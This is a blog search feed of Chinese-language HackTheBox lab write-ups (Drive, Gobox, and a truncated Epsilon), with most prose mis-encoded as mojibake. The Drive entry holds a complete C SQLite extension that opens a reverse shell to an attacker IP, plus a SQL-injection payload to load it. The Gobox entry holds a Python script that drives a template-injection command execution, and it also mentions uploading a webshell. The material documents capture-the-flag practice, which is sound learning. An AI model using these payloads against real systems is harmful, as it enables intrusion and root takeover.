<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Drive HackTheBox</title>
    <link href="/2023/10/22/Drive-HackTheBox/"/>
    <url>/2023/10/22/Drive-HackTheBox/</url>
    
    <content type="html"><![CDATA[<h1 id="Drive"><a href="#Drive" class="headerlink" title="Drive"></a>Drive</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled.png" alt="Untitled"></p><h3 id="80ç«¯å£-Web-ç«™ç‚¹"><a href="#80ç«¯å£-Web-ç«™ç‚¹" class="headerlink" title="80ç«¯å£ Web ç«™ç‚¹"></a>80ç«¯å£ Web ç«™ç‚¹</h3><p>è¿™ä¸ªå‘ç°ä¸€ä¸ªå®¢æˆ·çš„ç•™è¨€ï¼Œæ„Ÿè§‰æ˜¯ä¸€ç§æç¤ºã€‚åé¢æƒ³ç€å¾€è¶Šæƒçš„æ–¹å‘æ‰¾å…¶ä»–ç”¨æˆ·çš„è´¦å·å¯†ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%201.png" alt="Untitled"></p><h3 id="è¶Šæƒæ¼æ´è·å–è´¦å·å¯†ç "><a href="#è¶Šæƒæ¼æ´è·å–è´¦å·å¯†ç " class="headerlink" title="è¶Šæƒæ¼æ´è·å–è´¦å·å¯†ç "></a>è¶Šæƒæ¼æ´è·å–è´¦å·å¯†ç </h3><p>ç»è¿‡ä¸€æ®µæ—¶é—´çš„æŒ–æ˜åï¼Œå‘ç°ReserveåŠŸèƒ½å­˜åœ¨è¶Šæƒé—®é¢˜ã€‚å¯ä»¥Reverseåˆ«äººçš„æ–‡ä»¶ï¼Œä¹‹åå°±èƒ½çœ‹åˆ°æ–‡ä»¶çš„å†…å®¹äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%202.png" alt="Untitled"></p><p>ç”¨Burpsuiteéå†ï¼Œå‘ç°è´¦å·å¯†ç å’Œæç¤ºä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin<br>Xk4@KjyrYv8t194L!<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%203.png" alt="Untitled"></p><p>è¿™é‡Œæç¤ºä¼šå¤‡ä»½æ•°æ®åº“åˆ° <code>/var/www/backups</code> ç›®å½•ä¸‹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%204.png" alt="Untitled"></p><p>æ ¹æ®ä¸Šé¢çš„ä¿¡æ¯æ‰¾åˆ°äº†æ•°æ®åº“æ–‡ä»¶</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%205.png" alt="Untitled"></p><p>ç ´è§£db.sqlite3é‡Œçš„SHA1å¾—åˆ°è´¦æˆ·å¯†ç ï¼Œå°è¯•SSHå¤±è´¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tomHands:john316<br></code></pre></td></tr></table></figure><h3 id="gitea-æ³„éœ²è§£å‹å¯†ç "><a href="#gitea-æ³„éœ²è§£å‹å¯†ç " class="headerlink" title="gitea æ³„éœ²è§£å‹å¯†ç "></a>gitea æ³„éœ²è§£å‹å¯†ç </h3><p>è¿˜è®°å¾—ç«¯å£æ‰«æä¸­è¢«filteredçš„3000ç«¯å£å—ã€‚è¿›ç¨‹ä¸­ä¹Ÿå‘ç°äº†giteaï¼Œå®ƒçš„é»˜è®¤ç«¯å£å°±æ˜¯3000</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%206.png" alt="Untitled"></p><p>å¿«é€Ÿçš„ç«¯å£è½¬å‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Kaliï¼šssh -L 3000:127.0.0.1:3000 martin@drive.htb -fN<br>Windowsï¼šssh -L 3000:127.0.0.1:3000 admin@remoteIP -fN<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨è´¦æˆ·åå¯†ç ç™»å½• gitea</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">martin@drive.htb<br>Xk4@KjyrYv8t194L!<br></code></pre></td></tr></table></figure><p>è·å¾—å¤‡ä»½å¯†ç  <code>H@ckThisP@ssW0rDIfY0uC@n:)</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%207.png" alt="Untitled"></p><p>è§£å‹å¤‡ä»½æ–‡ä»¶ï¼Œå°è¯•çˆ†ç ´SHA1</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%208.png" alt="Untitled"></p><p>çˆ†å‡ºå‡ ä¸ªå¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">johniscool<br>johnmayer7<br>john316<br></code></pre></td></tr></table></figure><p>å°è¯•ç™»å½• ssh æˆåŠŸ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%209.png" alt="Untitled"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="åç¼–è¯‘-doodleGrive-cli"><a href="#åç¼–è¯‘-doodleGrive-cli" class="headerlink" title="åç¼–è¯‘ doodleGrive-cli"></a>åç¼–è¯‘ doodleGrive-cli</h3><p>linpeas çœ‹äº†ä¸€ä¸‹ï¼Œå…¶ä»–ä¿¡æ¯éƒ½å·®ä¸å¤šã€‚ææƒåº”è¯¥è¦åœ¨è¿™ä¸ª doodleGrive-cli ä¸‹åŠŸå¤«äº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2010.png" alt="Untitled"></p><p>åç¼–è¯‘çœ‹ä¸€ä¸‹ï¼Œé€šè¿‡è¿™ä¸ªè´¦å·å¯†ç å¯ä»¥ä½¿ç”¨ cli é‡Œçš„åŠŸèƒ½ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„åŠŸèƒ½éƒ½æ˜¯ä»¥ root æƒé™æ‰§è¡Œçš„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">moriarty<br>findMeIfY0uC@nMr.Holmz!<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2011.png" alt="Untitled"></p><p>è·Ÿè¿›ä¸€ä¸‹ main_menu() å‡½æ•°ä¸­è°ƒç”¨çš„ activate_user_account() å‡½æ•°å­˜åœ¨å‘½ä»¤æ³¨å…¥é—®é¢˜ï¼Œè¿™ä¸ªç¨‹åºåˆæ˜¯ä»¥ root è¿è¡Œçš„ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤ææƒ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2012.png" alt="Untitled"></p><p>ä½†ä¸€ç•ªç»è¿‡å°è¯•ï¼Œæˆ‘æ²¡èƒ½ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚activate_user_account() ä¸­å­˜åœ¨å­—ç¬¦è¿‡æ»¤å‡½æ•°sanitize_string()ï¼Œä¼šå°† local_29 ä¸­çš„å­—ç¬¦è¿‡æ»¤æ‰ï¼Œä¹Ÿå°±æ˜¯è¿‡æ»¤äº† <code>\ &#123; / | space &#39;</code>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">void sanitize_string(char *param_1)<br><br>&#123;<br>  bool bVar1;<br>  size_t sVar2;<br>  long in_FS_OFFSET;<br>  int local_3c;<br>  int local_38;<br>  uint local_30;<br>  undefined8 local_29;<br>  undefined local_21;<br>  long local_20;<br>  <br>  local_20 = *(long *)(in_FS_OFFSET + 0x28);<br>  local_3c = 0;<br>  local_29 = 0x5c7b2f7c20270a00;<br>  local_21 = 0x3b;<br>  local_38 = 0;<br>  <span class="hljs-keyword">do</span> &#123;<br>    sVar2 = strlen(param_1);<br>    <span class="hljs-keyword">if</span> (sVar2 &lt;= (ulong)(long)local_38) &#123;<br>      param_1[local_3c] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>      <span class="hljs-keyword">if</span> (local_20 != *(long *)(in_FS_OFFSET + 0x28)) &#123;<br>                    /* WARNING: Subroutine does not <span class="hljs-built_in">return</span> */<br>        __stack_chk_fail();<br>      &#125;<br>      <span class="hljs-built_in">return</span>;<br>    &#125;<br>    bVar1 = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span> (local_30 = 0; local_30 &lt; 9; local_30 = local_30 + 1) &#123;<br>      <span class="hljs-keyword">if</span> (param_1[local_38] == *(char *)((long)&amp;local_29 + (long)(int)local_30)) &#123;<br>        bVar1 = <span class="hljs-literal">true</span>;<br>        <span class="hljs-built_in">break</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!bVar1) &#123;<br>      param_1[local_3c] = param_1[local_38];<br>      local_3c = local_3c + 1;<br>    &#125;<br>    local_38 = local_38 + 1;<br>  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sqlite-load-extension-ææƒ"><a href="#sqlite-load-extension-ææƒ" class="headerlink" title="sqlite load_extension ææƒ"></a>sqlite load_extension ææƒ</h3><p>åé¢æƒ³åˆ°äº†sqlite SQL æ³¨å…¥ <strong><strong>load_extension</strong></strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">/* Add your header comment here */<br><span class="hljs-comment">#include &lt;sqlite3ext.h&gt; /* Do not use &lt;sqlite3.h&gt;! */</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/socket.h&gt;</span><br><span class="hljs-comment">#include &lt;arpa/inet.h&gt;</span><br><span class="hljs-comment">#include &lt;signal.h&gt;</span><br><span class="hljs-comment">#include &lt;dirent.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/stat.h&gt;</span><br>SQLITE_EXTENSION_INIT1<br><br>/* Insert your extension code here */<br>int tcp_port = 7777;<br>char *ip = <span class="hljs-string">&quot;10.10.14.67&quot;</span>;<br><br><span class="hljs-comment">#ifdef _WIN32</span><br>__declspec(dllexport)<br><span class="hljs-comment">#endif</span><br><br>int sqlite3_extension_init(<br>  sqlite3 *db, <br>  char **pzErrMsg, <br>  const sqlite3_api_routines *pApi<br>)&#123;<br>  int rc = SQLITE_OK;<br>  SQLITE_EXTENSION_INIT2(pApi);<br>  <br>  int fd;<br>  <span class="hljs-keyword">if</span> ( fork() &lt;= 0)&#123;<br>    struct sockaddr_in addr;<br>    addr.sin_family = AF_INET;<br>    addr.sin_port = htons(tcp_port);<br>    addr.sin_addr.s_addr = inet_addr(ip);<br><br>    fd = socket(AF_INET, SOCK_STREAM, 0);<br>    <span class="hljs-keyword">if</span> ( connect(fd, (struct sockaddr*)&amp;addr, sizeof(addr)) )&#123;<br>            <span class="hljs-built_in">exit</span>(0);<br>    &#125;<br><br>    dup2(fd, 0);<br>    dup2(fd, 1);<br>    dup2(fd, 2);<br>    execve(<span class="hljs-string">&quot;/bin/bash&quot;</span>, 0LL, 0LL);<br>&#125;<br>  <br>  <span class="hljs-built_in">return</span> rc;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘æˆ so æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -fPIC -shared shell.c -o t.so<br></code></pre></td></tr></table></figure><p>è¿›å…¥doodleGrive-cliï¼Œé€‰æ‹©5ï¼Œç”¨æˆ·åå¡«å†™ <code>&quot;+load_extension(char(46,47,116))--</code>ç»•è¿‡è¿‡æ»¤å‡½æ•°å¹¶åŠ è½½so</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2013.png" alt="Untitled"></p><p>å³å¯ç»•è¿‡è¿‡æ»¤å‡½æ•°ï¼ŒåŠ è½½soæ–‡ä»¶åå¼¹shell</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/Untitled%2014.png" alt="Untitled 14"></p>]]></content>
    
    
    <categories>
      
      <category>Pentest</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gobox-HackTheBox</title>
    <link href="/2023/09/19/Gobox-HackTheBox/"/>
    <url>/2023/09/19/Gobox-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>æ•´ä½“è¿˜æ˜¯æŒºéš¾çš„ï¼Œä½†æˆ‘ä¸å¤ªå–œæ¬¢æœ€åçš„tricks</p><p>Cloud Tracckç®—æ˜¯æ‰“å®Œäº†ï¼Œæœ€åä¸€å°æŒ£æ‰äº†ä¸€æ®µæ—¶é—´ï¼Œåé¢çœ‹writeupéœ€è¦é€†å‘çš„çŸ¥è¯†ï¼Œæ˜å¤©VIPå°±è¿‡æœŸäº†ï¼Œæ²¡æ—¶é—´ç ”ç©¶å“©</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_0xQ93xlPKu.png" alt=""></p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xDdwc3QHf1.png" alt=""></p><p>4566ç›´æ¥è®¿é—®ä¼š403</p><p>80å’Œ8080ç›®å½•çˆ†ç ´æ— æœ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Z58mGZb4qP.png" alt=""></p><h3 id="GoLang-SSTI-GetShell"><a href="#GoLang-SSTI-GetShell" class="headerlink" title="GoLang SSTI GetShell"></a>GoLang SSTI GetShell</h3><p><a href="http://10.10.11.113:8080/forgot/" title="http://10.10.11.113:8080/forgot/">http://10.10.11.113:8080/forgot/</a> å°è¯•SSTIä¼š502</p><p>è¿™æ—¶å€™æ²¡æ‹›äº†ï¼Œçœ‹äº†ä¸€ä¸‹writeupï¼ŒåŸæ¥ç¡®å®æ˜¯SSTIï¼Œåªä¸è¿‡æ˜¯Golangçš„ã€‚åˆå­¦åˆ°äº†</p><p><a href="https://forum.butian.net/share/1286">https://forum.butian.net/share/1286</a></p><p>è¿”å›æ¨¡æ¿ä¸­çš„æ‰€æœ‰å†…å®¹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Jg3jU95cY-.png" alt=""></p><p>çœ‹èµ·æ¥éå¸¸åƒè´¦å·å¯†ç ï¼Œç™»é™†åç›´æ¥çˆ†å‡ºæºä»£ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_uVyEAaVezc.png" alt=""></p><p>å¾ˆæ˜æ˜¾é€äº†ä¸ªRCE</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">func (u User) DebugCmd (test string) string &#123;<br>  ipp := strings.Split(test, <span class="hljs-string">&quot; &quot;</span>)<br>  <span class="hljs-built_in">bin</span> := strings.Join(ipp[:<span class="hljs-number">1</span>], <span class="hljs-string">&quot; &quot;</span>)<br>  args := strings.Join(ipp[<span class="hljs-number">1</span>:], <span class="hljs-string">&quot; &quot;</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(args) &gt; <span class="hljs-number">0</span>&#123;<br>    out, _ := <span class="hljs-built_in">exec</span>.Command(<span class="hljs-built_in">bin</span>, args).CombinedOutput()<br>    <span class="hljs-keyword">return</span> string(out)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    out, _ := <span class="hljs-built_in">exec</span>.Command(<span class="hljs-built_in">bin</span>).CombinedOutput()<br>    <span class="hljs-keyword">return</span> string(out)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œå‘½ä»¤</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aGxsWDC77s.png" alt=""></p><h3 id="è‡ªåˆ¶Shell"><a href="#è‡ªåˆ¶Shell" class="headerlink" title="è‡ªåˆ¶Shell"></a>è‡ªåˆ¶Shell</h3><p>èƒ½æ‰§è¡Œçš„å‘½ä»¤ç›¸å½“æœ‰é™ï¼Œåå¼¹Shellä¸€ç›´å¤±è´¥ã€‚ä»¥ä¸ºæ˜¯Glang SSTIçš„çŸ¥è¯†ç›²åŒºï¼Œåˆå»çœ‹äº†ä¸€ä¸‹writeupã€‚å¤§ä¼™ä¹Ÿåå¼¹ä¸äº†ï¼Œé€šè¿‡Pythonè„šæœ¬åšäº†ä¸ªæ–¹ä¾¿æ‰§è¡Œå‘½ä»¤çš„Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">from cmd import Cmd<br>import requests<br>import re<br><br>class Term(Cmd):<br>    prompt = <span class="hljs-string">&quot;pythonshell&gt; &quot;</span><br>    pattern = re.compile(r<span class="hljs-string">&#x27;Email Sent To: (.*?)\s+&lt;button class=&quot;btn btn-primary&#x27;</span>, re.DOTALL)<br>    def default(self, args):<br>        cmd = args.replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)<br>        res = requests.post(<span class="hljs-string">&#x27;http://10.10.11.113:8080/forgot/&#x27;</span>, data = &#123;<span class="hljs-string">&quot;email&quot;</span>:f<span class="hljs-string">&#x27;&#123;&#123;&#123;&#123; .DebugCmd &quot;&#123;cmd&#125;&quot; &#125;&#125;&#125;&#125;&#x27;</span>&#125;)<br>        try:<br>            res = self.pattern.search(res.text).group(1)<br>            <span class="hljs-built_in">print</span>(res)<br>        except Exception as e:<br>            <span class="hljs-built_in">print</span>(e)<br><br>    def do_exit(self, args):<br>        <span class="hljs-built_in">return</span> True<br><br>term = Term()<br>term.cmdloop()<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NeW8TdHd2z.png" alt=""></p><p>èƒ½æ‰§è¡Œçš„å‘½ä»¤ç›¸å½“æœ‰é™</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NhLjEMR4go.png" alt=""></p><p>åœ¨<code>/root</code>ä¸‹å‘ç°äº†awså‡­æ®</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_vuFZzs9Huh.png" alt=""></p><h3 id="å®¹å™¨é€ƒé€¸"><a href="#å®¹å™¨é€ƒé€¸" class="headerlink" title="å®¹å™¨é€ƒé€¸"></a>å®¹å™¨é€ƒé€¸</h3><p>çœ‹åˆ°s3é‡Œçš„å†…å®¹ï¼Œå°±æ˜¯ä¸»ç«™çš„å†…å®¹ã€‚è€Œä¸”æ˜¯PHPï¼Œå¯ä»¥è¯•è¯•ä¸Šä¼ ä¸ªWebshell</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ch-_L30F_1.png" alt=""></p><p>å†™ä¸ªç»å…¸çš„ğŸï¼Œå†ä¸Šä¼ ä¸Šå»</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5OOqbnxcyH.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_G_NcXscFcg.png" alt=""></p><p>Ubuntuç”¨æˆ·çš„user flagè¢«è®¾ç½®æˆ644ï¼Œå¯¼è‡´ä»»ä½•äººéƒ½å¯ä»¥è¯»</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_d_qS9jLOWI.png" alt=""></p><h3 id="ææƒé˜¶æ®µ"><a href="#ææƒé˜¶æ®µ" class="headerlink" title="ææƒé˜¶æ®µ"></a>ææƒé˜¶æ®µ</h3><p>4566ç«¯å£ä¹‹å‰è®¿é—®ä¼šç›´æ¥403ï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªç¡¬ç¼–ç token</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_v6Rnw4jFFA.png" alt=""></p><p>åˆç•™æ„åˆ°ä¸‹é¢è¿™ä¸ªcommand onï¼›æ²¡è§è¿‡è¿™ç§é…ç½®ï¼Œæ„Ÿè§‰æ˜¯ä¸ªéæ­£å¸¸è¡Œä¸ºã€‚</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Vx0xCUvLMw.png" alt=""></p><h4 id="Nginxåé—¨ææƒ"><a href="#Nginxåé—¨ææƒ" class="headerlink" title="Nginxåé—¨ææƒ"></a>Nginxåé—¨ææƒ</h4><p>ç•™æ„åˆ°nginxä½¿ç”¨rootç”¨æˆ·è¿è¡Œ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-AWDbvfHNg.png" alt=""></p><p>modules-enabled ç›®å½•ä¸‹å‘ç° backdoor.conf</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IqX3Kzd0PM.png" alt=""></p><p>äº†è§£äº†ä¸€ä¸‹çœŸæ˜¯åé—¨</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Z1QdpTH-qt.png" alt=""></p><p>æŒ‰ç…§é¡¹ç›®ä¿¡æ¯ç›´æ¥æ‰§è¡Œæ²¡æœ‰å›å¤</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cgznJHjLAf.png" alt=""></p><p>åˆçœ‹äº†ä¸‹writeupï¼Œstringså‘ç°ippsec.runã€‚æ‰èƒ½æ‰§è¡Œå‘½ä»¤</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IQyWFfXzMQ.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_923y1bFRx7.png" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
      <tag>Cloud Native Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Epsilon HackTheBox</title>
    <link href="/2023/09/17/Epsilon-HackTheBox/"/>
    <url>/2023/09/17/Epsilon-HackTheBox/</url>
    
    <content type="html"><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Xg04jRvdp-.png" alt=""></p><h4 id="gitæ³„éœ²"><a href="#gitæ³„éœ²" class="headerlink" title="gitæ³„éœ²"></a>gitæ³„éœ²</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OkHEk8v4Yz.png" alt=""></p><h4 id="ç¡¬ç¼–ç ç™»å½•"><a href="#ç¡¬ç¼–ç ç™»å½•" class="headerlink" title="ç¡¬ç¼–ç ç™»å½•"></a>ç¡¬ç¼–ç ç™»å½•</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8ahnopwPfR.png" style="zoom: 50%;" /></p><p>è¯·æ±‚æ­£å¸¸ï¼Œä½†è¿˜æ˜¯è¿”å›index.htmlï¼Œä¹Ÿæ²¡æœ‰set-Cookie</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_c8IeKryvZt.png" alt=""></p><p>è®¿é—®<code>/track</code>å‘ç°æˆ‘å·²ç»æ˜¯Adminäº†</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_lTwPnzFBaY.png" alt=""></p><p>ä½†å‘ä»€ä¹ˆéƒ½æ˜¯302è·³å›index&#x20;</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_tctk1rWCnL.png" alt=""></p><h3 id="commit-æ³„éœ²AKSK"><a href="#commit-æ³„éœ²AKSK" class="headerlink" title="commit æ³„éœ²AKSK"></a>commit æ³„éœ²AKSK</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_GbtkTnKvxe.png" alt=""></p><p>é…ç½®å¥½AKSKåï¼Œé€šè¿‡awscliæŸ¥çœ‹å¯ç”¨çš„lambdaå‡½æ•°</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fZ_PYLG-wC.png" alt=""></p><p>è·å–å‡½æ•°ä»£ç </p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MMOLO_7hMF.png" alt=""></p><p>ä»£ç æœ¬èº«æ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œä¹Ÿä¸çŸ¥é“å“ªé‡Œå¯ä»¥è§¦å‘ã€‚ä¸è¿‡è¿™ä¸ªsecretä¼šä¸ä¼šå¤ç”¨å‘¢ï¼Ÿ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Mw1ja9uH_u.png" alt=""></p><h3 id="secretå¤ç”¨"><a href="#secretå¤ç”¨" class="headerlink" title="secretå¤ç”¨"></a>secretå¤ç”¨</h3><p>é€šè¿‡æ³„éœ²çš„ä»£ç å’Œsecretç”ŸæˆJWT</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_F654C1Znj2.png" alt=""></p><p>æ·»åŠ åˆ°Cookieä¸­ï¼Œè¿™æ¬¡è®¿é—®homeæ²¡æœ‰é‡å®šå‘ï¼</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_t8UIq7kMRk.png" alt=""></p><p>æŠŠCookieå†™åˆ°æµè§ˆå™¨ç¼“å­˜é‡Œï¼Œæ–¹ä¾¿æŸ¥çœ‹</p><p><img 